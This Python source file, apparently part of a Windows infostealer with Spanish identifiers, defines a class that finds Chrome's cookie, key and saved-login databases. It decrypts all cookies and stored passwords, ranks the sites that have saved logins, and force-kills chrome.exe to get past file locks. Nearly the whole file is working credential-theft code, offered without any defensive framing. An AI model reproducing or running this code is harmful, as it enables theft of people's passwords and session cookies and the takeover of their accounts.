import base64
import json
import os
import shutil
import sqlite3
import binascii
import subprocess

import win32crypt
from Crypto.Cipher import AES

from models.chrome import ChromeCookie, ChromeUser
from models.firefox import FirefoxCookie, FirefoxUsuarios
from models.edge import EdgeCookie, edge_usuario_contrasenia
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from Crypto.Hash import SHA256
from Crypto.Protocol.KDF import PBKDF2
from repositories.cookie_repository import obtener_llave_session, desecriptar_dato

class CookieRepository_Chrome:
    def __init__(self):
       self.cookies_path_chrome = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default","Network", "Cookies")
       self.chrome_path_llaves = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
       self.chrome_path_user = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")

    #realizar una copia de la base de datos


    def get_chrome_cookies(self):
        cookies = []
        try:
            llave = obtener_llave_session(self.chrome_path_llaves)
            with conesiones_db(self.cookies_path_chrome) as conn:
                cursor = conn.cursor()
                cursor.execute("SELECT creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, last_update_utc FROM cookies")

                for creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, last_update_utc in cursor.fetchall():
                    try:
                        encrypted_value = desecriptar_dato(encrypted_value, llave)
                        cookies.append(ChromeCookie(creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, last_update_utc))
                    except Exception as e:
                        print(f"Error al desencriptar la cookie: {e}")
        except sqlite3.Error as e:
            print(f"Error al obtener las cookies: {e}")
        return cookies

    def get_chrome_cookies_session(self):
        cookies = []
        try:
            llave = obtener_llave_session(self.chrome_path_llaves)
            with conesiones_db(self.cookies_path_chrome) as conn:
                cursor = conn.cursor()
                cursor.execute("SELECT creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, last_update_utc FROM cookies WHERE is_secure = 1")
                for creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, last_update_utc in cursor.fetchall():
                    try:
                        encrypted_value = desecriptar_dato(encrypted_value, llave)
                        cookies.append(ChromeCookie(creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, last_update_utc))
                    except Exception as e:
                        print(f"Error al desencriptar la cookie: {e}")
        except sqlite3.Error as e:
            print(f"Error al obtener las cookies: {e}")
        return cookies

    def obtener_contrasenias(self):
        contrasenias = []
        try:
            llave = obtener_llave_session(self.chrome_path_llaves)
            with conesiones_db(self.chrome_path_user) as conn:
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value, signon_realm, date_created, date_last_used, date_password_modified FROM logins")
                for origin_url, username_value, password_value, signon_realm, date_created, date_last_used, date_password_modified in cursor.fetchall():
                    try:
                        if password_value and username_value:
                            password_value = desecriptar_dato(password_value, llave)
                            contrasenias.append(ChromeUser(origin_url, username_value, password_value, signon_realm, date_created, date_last_used, date_password_modified))
                        else:
                            continue

                    except Exception as e:
                        print(f"Error al desencriptar la contraseña: {e}")
        except sqlite3.Error as e:
            print(f"Error al obtener las contraseñas: {e}")
        return contrasenias

    def numeros_paginas_encontradas_sin_repetir(self):
    # obtener el numero de paginas encontradas sin repetir y su  url
        lista_paginas = []
        try:
            with conesiones_db(self.chrome_path_user) as conn:
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, COUNT(origin_url) FROM logins GROUP BY origin_url ORDER BY COUNT(origin_url) DESC")
                for origin_url, count in cursor.fetchall():
                    lista_paginas.append((origin_url, count))
        except sqlite3.Error as e:
            print(f"Error al obtener las paginas: {e}")
        return lista_paginas

    def top_ten_paginas_encontradas_sin_repetir(self):
    # obtener el top 10 de paginas encontradas sin repetir y su  url
        lista_paginas = []
        try:
            with conesiones_db(self.chrome_path_user) as conn:
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, COUNT(origin_url) FROM logins GROUP BY origin_url ORDER BY COUNT(origin_url) DESC LIMIT 10")
                for origin_url, count in cursor.fetchall():
                    lista_paginas.append((origin_url, count))
        except sqlite3.Error as e:
            print(f"Error al obtener las paginas: {e}")
        return lista_paginas

    def numero_contrasenias_encontradas(self):
    # obtener el numero de contraseñas encontradas
        try:
            with conesiones_db(self.chrome_path_user) as conn:
                cursor = conn.cursor()
                cursor.execute("SELECT COUNT(*) FROM logins WHERE password_value IS NOT NULL")
                row = cursor.fetchone()
                return row[0]
        except sqlite3.Error as e:
            print(f"Error al obtener el numero de contraseñas: {e}")
            return 0

    def count_session_cookies(self):
    # obtener el numero de cookies de session
        try:
            with conesiones_db(self.cookies_path_chrome) as conn:
                cursor = conn.cursor()
                cursor.execute("SELECT COUNT(*) FROM cookies WHERE is_secure = 1")
                row = cursor.fetchone()
            return row[0] if row else 0
        except sqlite3.Error as e:
            print(f"Error al obtener el numero de cookies de session: {e}")
            return 0




def verificar_conexion(path_db):
    try:
        conn = sqlite3.connect(path_db)
        conn.close()
        return True
    except sqlite3.Error as e:
        return False

def conesiones_db(path_db):
    try:
        if verificar_conexion(path_db):
            if os.path.exists(path_db + "copia"):
                os.remove(path_db + "copia")
            conn = sqlite3.connect(path_db)
            shutil.copy2(path_db, path_db + "copia")
            return conn
        else:
            conn = sqlite3.connect(path_db + "copia")
            return conn
    except sqlite3.Error as e:
        try:
            cerrar_proceso("chrome.exe")
        except Exception as e:
            print(f"Error al cerrar el proceso: {e}")
            pass


def cerrar_proceso(nombre_proceso):
    subprocess.call(['taskkill', '/F', '/IM', nombre_proceso])
    print(f"Proceso {nombre_proceso} cerrado")



